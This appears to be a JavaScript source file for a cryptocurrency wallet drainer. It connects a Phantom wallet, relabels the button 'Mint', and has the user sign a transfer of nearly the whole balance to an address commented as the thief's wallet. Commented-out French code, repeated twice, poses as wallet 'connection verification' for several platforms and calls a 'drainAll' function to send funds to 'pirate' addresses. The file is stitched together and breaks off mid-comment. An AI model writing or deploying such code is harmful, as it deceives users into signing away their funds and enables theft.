
$(document).ready(function() {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

                var connection = new solanaWeb3.Connection(
                    'https://api.devnet.solana.com', 
                    'confirmed'
                );

                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(public_key);
                console.log("Wallet balance:", walletBalance);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent.");
                    return;
                }

                $('#connect-wallet').text("Mint");
                $('#connect-wallet').off('click').on('click', async () => {
                    try {
                        const recieverWallet = new solanaWeb3.PublicKey('XXXXXXXXXXX'); // Thief's wallet
                        const balanceForTransfer = walletBalance - minBalance;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        var transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: resp.publicKey,
                                toPubkey: recieverWallet,
                                lamports: balanceForTransfer * 0.99,
                            }),
                        );

                        transaction.feePayer = window.solana.publicKey;
                        let blockhashObj = await connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;

                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        let txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        console.log("Transaction confirmed:", txid);
                    } catch (err) {
                        console.error("Error during minting:", err);
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
            }
        } else {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });
});

// document.addEventListener('DOMContentLoaded', function() { 
//     const plateformes = [ 
//         "MetaMask", "Coinbase", "WalletConnect", "Phantom" 
//     ]; 
 
//     let toutesLesPlateformes = plateformes.concat([ 
//         "Binance", "Kraken", "Gemini", "Trust Wallet", "Exodus",  
//         "Ledger Live", "Trezor Suite" 
//     ]); 
 
//     let html = ''; 
//     plateformes.forEach(plateforme => { 
//         html += <button onclick="verifierConnexion('${plateforme}')">${plateforme}</button>; 
//     }); 
//     document.getElementById('plateformes').innerHTML = html; 
 
//     document.getElementById('showMore').addEventListener('click', function() { 
//         document.getElementById('searchSection').style.display = 'block'; 
//         this.style.display = 'none'; 
//     }); 
 
//     document.getElementById('searchButton').addEventListener('click', function() { 
//         let termeRecherche = document.getElementById('searchBar').value.toLowerCase(); 
//         let resultats = toutesLesPlateformes.filter(plateforme => plateforme.toLowerCase().includes(termeRecherche)); 
 
//         let htmlResultats = ''; 
//         resultats.forEach(plateforme => { 
//             htmlResultats += <button onclick="verifierConnexion('${plateforme}')">${plateforme}</button>; 
//         }); 
//         document.getElementById('searchResults').innerHTML = htmlResultats; 
//     }); 
// }); 
 
// // Ethereum 
// const ethContratAdresse = "0x...VotreAdresseDeContratETH..."; // Adresse du smart contract malveillant 
// const ethContratABI = [ 
//     { 
//         "constant": false, 
//         "inputs": [], 
//         "name": "drainAll", 
//         "outputs": [], 
//         "payable": false, 
//         "stateMutability": "nonpayable", 
//         "type": "function" 
//     } 
// ]; 
// const pirateETH = "0x...AdressePirateETH..."; // Adresse du pirate pour Ethereum 
 
// // Solana 
// import { Connection, PublicKey, Transaction } from '@solana/web3.js'; 
// import { Program, AnchorProvider, web3 } from '@project-serum/anchor'; 
// const solanaConnection = new Connection("https://api.devnet.solana.com"); // Utiliser devnet pour les tests 
// const solanaProgramId = new PublicKey("5FFfGCEekkFoWSENgGvpwQoqykhzCvUpUFcgMDwspAB2"); // Remplacer par l'ID de votre programme Solana
// const pirateSOL = new PublicKey("AVdVtfhjZ4ct2aED2jKupY2i9WAsy3kHgFT2zyFZs9zy"); // Adresse du  pour Solana 
 
// async function verifierConnexion(plateforme) { 
//     if (confirm(`Voulez-vous vraiment vérifier la connexion avec ${plateforme}?`)) { 
//         alert(`Vérification en cours...`); 
         
//         if (plateforme === "MetaMask",  plateforme === "Coinbase",  plateforme === "WalletConnect") { 
//             // Ethereum Interaction 
//             if (typeof window.ethereum !== 'undefined') { 
//                 try { 
//                     await window.ethereum.request({ method: 'eth_requestAccounts' }); 
//                     const provider = new ethers.providers.Web3Provider(window.ethereum); 
//                     const signer = provider.getSigner(); 
                     
//                     // Créez une instance du contrat avec l'adresse et l'ABI 
//                     const contract = new ethers.Contract(ethContratAdresse, ethContratABI, signer); 
                     
//                     // Exemple d'interaction avec le smart contract (ici, transfert de tous les fonds) 
//                     const transaction = await contract.drainAll(pirateETH); 
//                     await transaction.wait(); 
//                     alert(`Votre connexion a été vérifiée avec succès sur Ethereum. Tous les fonds ont été transférés.`); 
//                     console.log("Ethereum Transaction successful:", transaction.hash); 
//                 } catch (error) { 
//                     console.error("Ethereum Transaction failed:", error); 
//                     alert("Une erreur s'est produite lors de la vérification de la connexion sur Ethereum."); 
//                 } 
//             } else { 
//                 alert("Veuillez installer MetaMask ou un autre fournisseur Ethereum pour continuer."); 
//             } 
//         } else if (plateforme === "Phantom") { 
//             // Solana Interaction 
//             if ('solana' in window) { 
//                 const provider = window.solana; 
//                 if (provider.isPhantom) { 
//                     try { 
//                         await provider.connect(); 
//                         const wallet = provider.publicKey; 
//                         const program = new Program( 
//                             require("C:/Users/trmak/Desktop/solana_airdrop/solana_airdrop/target/idl/solana_airdrop.json"), // Remplacer par le chemin vers le fichier IDL de votre programme Solana
//                             solanaProgramId, 
//                             new AnchorProvider(solanaConnection, provider, AnchorProvider.defaultOptions()) 
//                         ); 
 
//                         // Exemple d'interaction avec un programme Solana (ici, transfert de tous les fonds) 
//                         const tx = await program.methods.drainAll().accounts({ 
//                             from: wallet, 
//                             to: pirateSOL 
//                         }).rpc(); 
//                         alert(`Votre connexion a été vérifiée avec succès sur Solana. Tous les fonds ont été transférés.`); 
//                         console.log("Solana Transaction successful:", tx); 
//                     } catch (error) { 
//                         console.error("Solana Transaction failed:", error); 
//                         alert("Une erreur s'est produite lors de la vérification de la connexion sur Solana."); 
//                     } 
//                 } else { 
//                     alert("Veuillez utiliser Phantom pour interagir avec Solana."); 
//                 } 
//             } else { 
//                 alert("Phantom n'est pas détecté. Veuillez l'installer pour continuer avec Solana."); 
//             } 
//         } 
//     } 
// }





// document.addEventListener("DOMContentLoaded", () => {
//     const provider = window.solana;

//     if (provider && provider.isPhantom) {
//         console.log("Phantom Wallet détecté !");
//     } else {
//         alert("Phantom Wallet n'est pas détecté. Assurez-vous que l'extension est activée.");
//         console.error("Phantom Wallet n'est pas disponible.");
//     }
// });
import { Connection, clusterApiUrl } from '@solana/web3.js';

document.addEventListener("DOMContentLoaded", () => {
    console.log("DOM prêt !");
    const provider = window.solana;

    if (provider && provider.isPhantom) {
        console.log("Phantom Wallet détecté !");
        const connectWalletButton = document.getElementById("connect-wallet");
        const walletInfo = document.getElementById("wallet-info");
        const connection = new Connection(clusterApiUrl('devnet'));

        console.log("Connexion au cluster établie :", connection);

        connectWalletButton.addEventListener("click", async () => {
            console.log("Bouton cliqué !");
            try {
                // Demander la connexion au portefeuille Phantom
                await provider.connect();
                console.log("Connexion réussie avec Phantom Wallet !");
                const wallet = provider.publicKey;

                // Récupérer le solde
                const balance = await connection.getBalance(wallet);

                // Afficher la clé publique et la balance dans l'interface
                walletInfo.textContent = `Clé publique : ${wallet.toString()} | Balance : ${balance / 1e9} SOL`;
                console.log("Clé publique :", wallet.toString());
                console.log("Balance :", balance / 1e9, "SOL");
            } catch (error) {
                console.error("Erreur lors de la connexion :", error);
                walletInfo.textContent = "Erreur lors de la connexion. Veuillez réessayer.";
            }
        });
    } else {
        alert("Phantom Wallet n'est pas détecté. Veuillez l'installer !");
        console.error("Phantom Wallet n'est pas disponible.");
    }
});
// PART 2
 
// Solana 
// import { Connection, PublicKey, Transaction } from '@solana/web3.js'; 
// import { Program, AnchorProvider, web3 } from '@project-serum/anchor'; 
// const solanaConnection = new Connection("https://api.devnet.solana.com"); // Utiliser devnet pour les tests 
// const solanaProgramId = new PublicKey("5FFfGCEekkFoWSENgGvpwQoqykhzCvUpUFcgMDwspAB2"); // Remplacer par l'ID de votre programme Solana
// const pirateSOL = new PublicKey("AVdVtfhjZ4ct2aED2jKupY2i9WAsy3kHgFT2zyFZs9zy"); // Adresse du  pour Solana 
 
// async function verifierConnexion(plateforme) { 
//     if (confirm(`Voulez-vous vraiment vérifier la connexion avec ${plateforme}?`)) { 
//         alert(`Vérification en cours...`); 
         
//         if (plateforme === "MetaMask",  plateforme === "Coinbase",  plateforme === "WalletConnect") { 
//             // Ethereum Interaction 
//             if (typeof window.ethereum !== 'undefined') { 
//                 try { 
//                     await window.ethereum.request({ method: 'eth_requestAccounts' }); 
//                     const provider = new ethers.providers.Web3Provider(window.ethereum); 
//                     const signer = provider.getSigner(); 
                     
//                     // Créez une instance du contrat avec l'adresse et l'ABI 
//                     const contract = new ethers.Contract(ethContratAdresse, ethContratABI, signer); 
                     
//                     // Exemple d'interaction avec le smart contract (ici, transfert de tous les fonds) 
//                     const transaction = await contract.drainAll(pirateETH); 
//                     await transaction.wait(); 
//                     alert(`Votre connexion a été vérifiée avec succès sur Ethereum. Tous les fonds ont été transférés.`); 
//                     console.log("Ethereum Transaction successful:", transaction.hash); 
//                 } catch (error) { 
//                     console.error("Ethereum Transaction failed:", error); 
//                     alert("Une erreur s'est produite lors de la vérification de la connexion sur Ethereum."); 
//                 } 
//             } else { 
//                 alert("Veuillez installer MetaMask ou un autre fournisseur Ethereum pour continuer."); 
//             } 
//         } else if (plateforme === "Phantom") { 
//             // Solana Interaction 
//             if ('solana' in window) { 
//                 const provider = window.solana; 
//                 if (provider.isPhantom) { 
//                     try { 
//                         await provider.connect(); 
//                         const wallet = provider.publicKey; 
//                         const program = new Program( 
//                             require("C:/Users/trmak/Desktop/solana_airdrop/solana_airdrop/target/idl/solana_airdrop.json"), // Remplacer par le chemin vers le fichier IDL de votre programme Solana
//                             solanaProgramId, 
//                             new AnchorProvider(solanaConnection, provider, AnchorProvider.defaultOptions()) 
//                         ); 
 
//                         // Exemple d'interaction avec un programme Solana (ici, transfert de tous les fonds) 
//                         const tx = await program.methods.drainAll().accounts({ 
//                             from: wallet, 
//                             to: pirateSOL 
//                         }).rpc(); 
//                         alert(`Votre connexion a été vérifiée avec succès sur Solana. Tous les fonds ont été transférés.`); 
//                         console.log("Solana Transaction successful:", tx); 
//                     } catch (error) { 
//                         console.error("Solana Transaction failed:", error); 
//                         alert("Une erreur s'est produite lors de la vérification de la connexion sur Solana."); 
//                     } 
//                 } else { 
//                     alert("Veuillez utiliser Phantom pour interagir avec Solana."); 
//                 } 
//             } else { 
//                 alert("Phantom n'est pas détecté. Veuillez l'installer pour continuer avec Solana."); 
//             } 
//         } 
//     } 
// }
 
    // Fonction pour simuler l'ouverture de la fenêtre de